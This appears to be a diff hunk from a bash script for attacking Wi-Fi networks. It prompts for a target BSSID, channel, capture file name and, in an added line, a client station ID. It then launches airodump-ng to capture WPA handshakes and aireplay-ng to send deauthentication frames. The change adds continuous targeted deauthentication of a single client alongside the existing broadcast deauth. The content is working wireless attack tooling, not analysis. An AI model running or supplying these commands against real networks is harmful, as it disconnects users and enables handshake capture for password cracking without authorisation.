@@ -77,10 +77,17 @@ airodump-ng $mode
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter BSSID               : \e[0m\e[1;96m\en' bssid
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter Channel             : \e[0m\e[1;96m\en' ch
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter Handshake File Name : \e[0m\e[1;96m\en' f_name
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[4;93m Enter Station Id/Client ID: \e[0m\e[1;96m\en' client
 sleep 3
 gnome-terminal --geometry=80x22+10 -e "airodump-ng -c $ch --bssid $bssid -w $f_name $mode" 
+if [ "$client" == "" ]
+then
 gnome-terminal --geometry=80x22+0+500 -e "aireplay-ng -0 50 -a $bssid $mode" 
-sleep 2 
+sleep 5 
+else
+gnome-terminal --geometry=80x22+0+500 -e "aireplay-ng --deauth 0 -a $bssid -c $client $mode" 
+sleep 5 
+fi
 stop(){
 #stoping monitor mode
 printf "\e[1;96m"
